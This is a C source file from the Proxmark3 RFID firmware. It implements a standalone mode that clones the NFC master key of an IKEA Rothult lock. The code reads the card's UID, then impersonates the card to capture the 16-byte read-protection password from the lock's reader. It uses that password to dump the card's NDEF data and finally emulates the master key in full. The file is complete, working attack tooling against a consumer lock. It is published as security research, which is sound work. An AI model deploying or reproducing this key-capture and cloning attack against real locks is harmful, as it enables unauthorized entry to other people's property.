//-----------------------------------------------------------------------------
// Copyright (C) Nick Draffen, 2020
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// code for HF ST25TA IKEA Rothult read/sim/dump/emulation by Nick Draffen
//-----------------------------------------------------------------------------
#include "standalone.h"
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "string.h"
#include "BigBuf.h"
#include "iso14443a.h"
#include "protocols.h"
#include "cmd.h"

void ModInfo(void) {
    DbpString("  HF - IKEA Rothult ST25TA, Standalone Master Key Dump/Emulation (ISO14443) - (Nick Draffen)");
}

/* This standalone implements four different modes: reading, simulating, dumping, & emulating.
*
* The initial mode is reading with LEDs A & D.
* In this mode, the Proxmark is looking for an ST25TA card like those used by the IKEA Rothult,
* it will act as reader, and store the UID for simulation.
*
* If the Proxmark gets an ST25TA UID, it will change to simulation mode (LEDs A & C) automatically.
* During this mode the Proxmark will pretend to be the IKEA Rothult ST25TA master key, upon presentation
* to an IKEA Rothult the Proxmark will steal the 16 byte Read Protection key used to authenticate to the card.
*
* Once it gets the key, it will switch to dump mode (LEDs C & D) automatically. During this mode the Proxmark
* will act as a reader once again, but now we know the Read Protection key to authenticate to the card to dump
* it's contents so we can achieve full emulation.
*
* Once it dumps the contents of the card, it will switch to emulation mode (LED C) automatically.
* During this mode the Proxmark should function as the original ST25TA IKEA Rothult Master Key
*
* Keep pressing the button down will quit the standalone cycle.
*
* LEDs:
* LED A & D = in reading mode
* LED A & C = in simulation mode, to steal Read Protection key
* LED C & D = in dump mode, to authenticate to card and dump NDEF content
* LED C = in emulation mode
* LED B = receiving/sending commands, activity
*
* Thanks to Salvador Mendoza for which this standalone mode is based off
* Thanks to iceman for his assistance on the ST25TA research
*/

void RunMod(void) {
    StandAloneMode();
    DbpString(_YELLOW_(">>") "IKEA Rothult ST25TA Standalone (tcprst) Started " _YELLOW_("<<"));
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

    uint8_t stuid[7] = {0x00};

    //For reading process
    iso14a_card_select_t card_a_info;
    uint8_t apdubuffer[MAX_FRAME_SIZE] = { 0x00 };

    // APDUs necessary to dump NDEF
    // ----------------------------
    // Select NDEF Application
    uint8_t ndef_app[13] = {0x00, 0xa4, 0x04, 0x00, 0x07, 0xd2, 0x76, 0x00, 0x00, 0x85, 0x01, 0x01, 0x00};
    // Select NDEF File
    uint8_t ndef_sel[7] = {0x00, 0xa4, 0x00, 0x0c, 0x02, 0x00, 0x01};
    // Read verification without password
    uint8_t verify[5] = {0x00, 0x20, 0x00, 0x01, 0x00};
    // Read verification with password
    uint8_t verify_pwd[21] = {0x00, 0x20, 0x00, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    // Read NDEF file contents
    uint8_t ndef_read[5] = {0x00, 0xb0, 0x00, 0x00, 0x1d};

    uint8_t *apdus[5] = {ndef_app, ndef_sel, verify, verify_pwd, ndef_read};
    uint8_t apdusLen [5] = { sizeof(ndef_app), sizeof(ndef_sel), sizeof(verify), sizeof(verify_pwd), sizeof(ndef_read)};

    // NDEF file contents
    uint8_t ndef[31] = {0x00, 0x1b, 0xd1, 0x01, 0x17, 0x54, 0x02, 0x7a, 0x68, 0xa2, 0x34, 0xcb, 0xd0, 0xe2, 0x03, 0xc7, 0x3e, 0x62, 0x0b, 0xe8, 0xc6, 0x3c, 0x85, 0x2c, 0xc5, 0x31, 0x31, 0x31, 0x32, 0x90, 0x00};
    uint8_t ndef_len = 31;

    // Did we get the read protection key from the Rothult
    bool gotkey = false;
    // Did we get the NDEF file contents from the card
    bool gotndef = false;


//ST25TA Rothult values
#define SAK 0x20
#define ATQA0 0x42
#define ATQA1 0x00

// Allocate 512 bytes for the dynamic modulation, created when the reader queries for it
// Such a response is less time critical, so we can prepare them on the fly
#define DYNAMIC_RESPONSE_BUFFER_SIZE 64
#define DYNAMIC_MODULATION_BUFFER_SIZE 512

    uint8_t flags = FLAG_7B_UID_IN_DATA; // ST25TA have 7B UID
    uint8_t data[PM3_CMD_DATA_SIZE] = {0x00}; // in case there is a read command received we shouldn't break

    // to initialize the emulation
    uint8_t tagType = 10; // 10 = ST25TA IKEA Rothult
    tag_response_info_t *responses;
    uint32_t cuid = 0;
    uint32_t counters[3] = { 0x00, 0x00, 0x00 };
    uint8_t tearings[3] = { 0xbd, 0xbd, 0xbd };
    uint8_t pages = 0;

    // command buffers
    uint8_t receivedCmd[MAX_FRAME_SIZE] = { 0x00 };
    uint8_t receivedCmdPar[MAX_PARITY_SIZE] = { 0x00 };

    uint8_t dynamic_response_buffer[DYNAMIC_RESPONSE_BUFFER_SIZE] = {0};
    uint8_t dynamic_modulation_buffer[DYNAMIC_MODULATION_BUFFER_SIZE] = {0};

    // handler - command responses
    tag_response_info_t dynamic_response_info = {
        .response = dynamic_response_buffer,
        .response_n = 0,
        .modulation = dynamic_modulation_buffer,
        .modulation_n = 0
    };

// States for standalone
#define STATE_READ 0
#define STATE_SIM  1
#define STATE_DUMP 2
#define STATE_EMUL 3

    uint8_t state = STATE_READ;

    DbpString(_YELLOW_("[ ") "Initialized reading mode" _YELLOW_(" ]"));
    DbpString("\n"_YELLOW_("!!") "Waiting for an IKEA ST25TA card...");

    for (;;) {
        WDT_HIT();

        // exit from RunMod, send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(1000);

        if (button_pressed  == BUTTON_HOLD) {       //Holding down the button
            break;
        }

        SpinDelay(500);

        if (state == STATE_READ) {
            LED_D_ON();
            LED_A_ON();
            // Get UID of ST25TA Card to simulate
            iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);

            if (iso14443a_select_card(NULL, &card_a_info, NULL, true, 0, false)) {

                DbpString(_YELLOW_("+") "Found ISO 14443 Type A!");

                if (card_a_info.sak == SAK && card_a_info.atqa[0] == ATQA0 && card_a_info.atqa[1] == ATQA1 && card_a_info.uidlen == 7) {
                    DbpString(_YELLOW_("+") "Found ST25TA with UID: ");
                    Dbhexdump(card_a_info.uidlen, card_a_info.uid, 0);
                    memcpy(stuid, card_a_info.uid, card_a_info.uidlen);
                    state = STATE_SIM;
                } else {
                    DbpString("Found non-ST25TA card, ignoring.");
                }
            }
            FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
        } else if (state == STATE_SIM) {
            LED_C_ON();

            //Simulate tag to get PWD

            // free eventually allocated BigBuf memory but keep Emulator Memory
            BigBuf_free_keep_EM();

            memcpy(data, stuid, sizeof(stuid));

            if (SimulateIso14443aInit(tagType, flags, data, &responses, &cuid, counters, tearings, &pages) == false) {
                BigBuf_free_keep_EM();
                reply_ng(CMD_HF_MIFARE_SIMULATE, PM3_EINIT, NULL, 0);
                DbpString(_YELLOW_("!!") "Error initializing the simulation process!");
                SpinDelay(500);
                state = STATE_READ;
                DbpString(_YELLOW_("[ ") "Initialized reading mode" _YELLOW_(" ]"));
                DbpString("\n" _YELLOW_("!!") "Waiting for an ST25TA card...");
                continue;
            }

            // We need to listen to the high-frequency, peak-detected path.
            iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

            int len = 0;              // command length
            int retval = PM3_SUCCESS; // to check emulation status

            bool odd_reply = true;

            clear_trace();
            set_tracing(true);

            while (!gotkey) {
                LED_B_OFF();
                // Clean receive command buffer
                if (!GetIso14443aCommandFromReader(receivedCmd, receivedCmdPar, &len)) {
                    DbpString(_YELLOW_("!!") "Emulator stopped");
                    retval = PM3_EOPABORTED;
                    break;
                }
                tag_response_info_t *p_response = NULL;
                LED_B_ON();

                // dynamic_response_info will be in charge of responses
                dynamic_response_info.response_n = 0;

                // Checking the commands order is important and elemental
                if (receivedCmd[0] == ISO14443A_CMD_REQA && len == 1) {         // Received a REQUEST
                    odd_reply = !odd_reply;
                    if (odd_reply)
                        p_response = &responses[RESP_INDEX_ATQA];
                } else if (receivedCmd[0] == ISO14443A_CMD_HALT && len == 4) {  // Received a HALT
                    p_response = NULL;
                } else if (receivedCmd[0] == ISO14443A_CMD_WUPA && len == 1) {  // Received a WAKEUP
                    p_response = &responses[RESP_INDEX_ATQA];
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 2) {    // Received request for UID (cascade 1)
                    p_response = &responses[RESP_INDEX_UIDC1];
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 2) {  // Received request for UID (cascade 2)
                    p_response = &responses[RESP_INDEX_UIDC2];
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 9) {    // Received a SELECT (cascade 1)
                    p_response = &responses[RESP_INDEX_SAKC1];
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 9) {  // Received a SELECT (cascade 2)
                    p_response = &responses[RESP_INDEX_SAKC2];
                } else if (receivedCmd[0] == ISO14443A_CMD_RATS && len == 4) {  // Received a RATS request
                    p_response = &responses[RESP_INDEX_RATS];
                } else if (receivedCmd[0] == ISO14443A_CMD_PPS) {
                    p_response = &responses[RESP_INDEX_PPS];
                } else {
                    DbpString(_YELLOW_("[ ") "Card reader command" _YELLOW_(" ]"));
                    Dbhexdump(len, receivedCmd, false);

                    if (receivedCmd[0] == 0x02 || receivedCmd[0] == 0x03) { //Emulate an ST25TA IKEA Rothult Master Key
                        dynamic_response_info.response[0] = receivedCmd[0];

                        if (memcmp("\x02\xa2\xb0\x00\x00\x1d\x51\x69", receivedCmd, 8) == 0) {
                            memcpy(dynamic_response_info.response + 1, ndef, 31);
                            dynamic_response_info.response_n = 32;
                        } else if (memcmp("\x02\x00\x20\x00\x01\x00\x6e\xa9", receivedCmd, 8) == 0) {
                            dynamic_response_info.response[1] = 0x63;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                        } else if (memcmp("\x03\x00\x20\x00\x01\x10", receivedCmd, 6) == 0) {
                            memcpy(verify_pwd + 5, receivedCmd + 6, 16);
                            DbpString("Reader sent password: ");
                            Dbhexdump(16, verify_pwd + 5, 0);
                            dynamic_response_info.response[1] = 0x90;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                            gotkey = true;
                            state = STATE_DUMP;
                        } else {
                            dynamic_response_info.response[1] = 0x90;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                        }
                    } else {
                        DbpString(_YELLOW_("!!") "Received unknown command!");
                        memcpy(dynamic_response_info.response, receivedCmd, len);
                        dynamic_response_info.response_n = len;
                    }
                }
                if (dynamic_response_info.response_n > 0) {
                    DbpString(_GREEN_("[ ") "Proxmark3 answer" _GREEN_(" ]"));
                    Dbhexdump(dynamic_response_info.response_n, dynamic_response_info.response, false);
                    DbpString("----");

                    // Add CRC bytes, always used in ISO 14443A-4 compliant cards
                    AddCrc14A(dynamic_response_info.response, dynamic_response_info.response_n);
                    dynamic_response_info.response_n += 2;

                    if (prepare_tag_modulation(&dynamic_response_info, DYNAMIC_MODULATION_BUFFER_SIZE) == false) {
                        SpinDelay(500);
                        DbpString(_YELLOW_("!!") "Error preparing Proxmark to answer!");
                        continue;
                    }
                    p_response = &dynamic_response_info;
                }

                if (p_response != NULL) {
                    EmSendPrecompiledCmd(p_response);
                }
            }
            switch_off();

            set_tracing(false);
            BigBuf_free_keep_EM();
            reply_ng(CMD_HF_MIFARE_SIMULATE, retval, NULL, 0);

        } else if (state == STATE_DUMP) {
            LED_A_OFF();
            LED_C_ON();
            LED_D_ON();

            iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);

            if (iso14443a_select_card(NULL, &card_a_info, NULL, true, 0, false)) {

                DbpString(_YELLOW_("+") "Found ISO 14443 Type A!");

                for (uint8_t i = 0; i < 5; i++) {
                    gotndef = false;
                    LED_B_ON();
                    uint8_t apdulen = iso14_apdu(apdus[i], (uint16_t) apdusLen[i], false, apdubuffer, NULL);

                    if (apdulen > 2) {
                        DbpString(_YELLOW_("[ ") "Proxmark command" _YELLOW_(" ]"));
                        Dbhexdump(apdusLen[i], apdus[i], false);
                        DbpString(_GREEN_("[ ") "Card answer" _GREEN_(" ]"));
                        Dbhexdump(apdulen - 2, apdubuffer, false);
                        DbpString("----");


                        if (i == 4) {
                            // Get NDEF Data
                            if (apdubuffer[1] == 0x1b && apdubuffer[2] == 0xd1) {
                                gotndef = true;
                                memcpy(&ndef, &apdubuffer, apdulen - 2);
                                break;
                            }
                        }

                    } else {
                        DbpString(_YELLOW_("!!") "Error reading the card");
                    }
                    LED_B_OFF();
                }

                if (gotndef) {
                    DbpString(_RED_("[ ") "NDEF File" _RED_(" ]"));
                    Dbhexdump(ndef_len, (uint8_t *)ndef, false);
                    DbpString("---");
                    LED_C_ON();
                    state = STATE_EMUL;
                    DbpString(_YELLOW_("[ ") "Initialized emulation mode" _YELLOW_(" ]"));
                    DbpString("\n"_YELLOW_("!!") "Waiting for a card reader...");
                }
            }
            FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);

        } else if (state == STATE_EMUL) {
            LED_D_OFF();
            LED_C_ON();

            // free eventually allocated BigBuf memory but keep Emulator Memory
            BigBuf_free_keep_EM();

            memcpy(data, stuid, sizeof(stuid));

            if (SimulateIso14443aInit(tagType, flags, data, &responses, &cuid, counters, tearings, &pages) == false) {
                BigBuf_free_keep_EM();
                reply_ng(CMD_HF_MIFARE_SIMULATE, PM3_EINIT, NULL, 0);
                DbpString(_YELLOW_("!!") "Error initializing the simulation process!");
                SpinDelay(500);
                state = STATE_READ;
                DbpString(_YELLOW_("[ ") "Initialized reading mode" _YELLOW_(" ]"));
                DbpString("\n" _YELLOW_("!!") "Waiting for an ST25TA card...");
                continue;
            }

            // We need to listen to the high-frequency, peak-detected path.
            iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

            int len = 0;              // command length
            int retval = PM3_SUCCESS; // to check emulation status

            bool odd_reply = true;

            clear_trace();
            set_tracing(true);

            for (;;) {
                LED_B_OFF();
                // Clean receive command buffer
                if (!GetIso14443aCommandFromReader(receivedCmd, receivedCmdPar, &len)) {
                    DbpString(_YELLOW_("!!") "Emulator stopped");
                    retval = PM3_EOPABORTED;
                    break;
                }
                tag_response_info_t *p_response = NULL;
                LED_B_ON();

                // dynamic_response_info will be in charge of responses
                dynamic_response_info.response_n = 0;

                // Checking the commands order is important and elemental
                if (receivedCmd[0] == ISO14443A_CMD_REQA && len == 1) {         // Received a REQUEST
                    odd_reply = !odd_reply;
                    if (odd_reply)
                        p_response = &responses[RESP_INDEX_ATQA];
                } else if (receivedCmd[0] == ISO14443A_CMD_HALT && len == 4) {  // Received a HALT
                    p_response = NULL;
                } else if (receivedCmd[0] == ISO14443A_CMD_WUPA && len == 1) {  // Received a WAKEUP
                    p_response = &responses[RESP_INDEX_ATQA];
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 2) {    // Received request for UID (cascade 1)
                    p_response = &responses[RESP_INDEX_UIDC1];
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 2) {  // Received request for UID (cascade 2)
                    p_response = &responses[RESP_INDEX_UIDC2];
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 9) {    // Received a SELECT (cascade 1)
                    p_response = &responses[RESP_INDEX_SAKC1];
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 9) {  // Received a SELECT (cascade 2)
                    p_response = &responses[RESP_INDEX_SAKC2];
                } else if (receivedCmd[0] == ISO14443A_CMD_RATS && len == 4) {  // Received a RATS request
                    p_response = &responses[RESP_INDEX_RATS];
                } else if (receivedCmd[0] == ISO14443A_CMD_PPS) {
                    p_response = &responses[RESP_INDEX_PPS];
                } else {
                    DbpString(_YELLOW_("[ ") "Card reader command" _YELLOW_(" ]"));
                    Dbhexdump(len, receivedCmd, false);

                    if (receivedCmd[0] == 0x02 || receivedCmd[0] == 0x03) { //Emulate an ST25TA IKEA Rothult Master Key
                        dynamic_response_info.response[0] = receivedCmd[0];

                        if (memcmp("\x02\xa2\xb0\x00\x00\x1d\x51\x69", receivedCmd, 8) == 0) {
                            memcpy(dynamic_response_info.response + 1, ndef, 31);
                            dynamic_response_info.response_n = 32;
                        } else if (memcmp("\x02\x00\x20\x00\x01\x00\x6e\xa9", receivedCmd, 8) == 0) {
                            dynamic_response_info.response[1] = 0x63;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                        } else if (memcmp("\x03\x00\x20\x00\x01\x10", receivedCmd, 6) == 0) {
                            memcpy(verify_pwd + 5, receivedCmd + 6, 16);
                            DbpString("Reader sent password: ");
                            Dbhexdump(16, verify_pwd + 5, 0);
                            dynamic_response_info.response[1] = 0x90;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                        } else {
                            dynamic_response_info.response[1] = 0x90;
                            dynamic_response_info.response[2] = 0x00;
                            dynamic_response_info.response_n = 3;
                        }
                    } else {
                        DbpString(_YELLOW_("!!") "Received unknown command!");
                        memcpy(dynamic_response_info.response, receivedCmd, len);
                        dynamic_response_info.response_n = len;
                    }
                }
                if (dynamic_response_info.response_n > 0) {
                    DbpString(_GREEN_("[ ") "Proxmark3 answer" _GREEN_(" ]"));
                    Dbhexdump(dynamic_response_info.response_n, dynamic_response_info.response, false);
                    DbpString("----");

                    // Add CRC bytes, always used in ISO 14443A-4 compliant cards
                    AddCrc14A(dynamic_response_info.response, dynamic_response_info.response_n);
                    dynamic_response_info.response_n += 2;

                    if (prepare_tag_modulation(&dynamic_response_info, DYNAMIC_MODULATION_BUFFER_SIZE) == false) {
                        SpinDelay(500);
                        DbpString(_YELLOW_("!!") "Error preparing Proxmark to answer!");
                        continue;
                    }
                    p_response = &dynamic_response_info;
                }

                if (p_response != NULL) {
                    EmSendPrecompiledCmd(p_response);
                }
            }
            switch_off();

            set_tracing(false);
            BigBuf_free_keep_EM();
            reply_ng(CMD_HF_MIFARE_SIMULATE, retval, NULL, 0);
        }
    }
    DbpString(_YELLOW_("[=]") "exiting");
    LEDsoff();
}
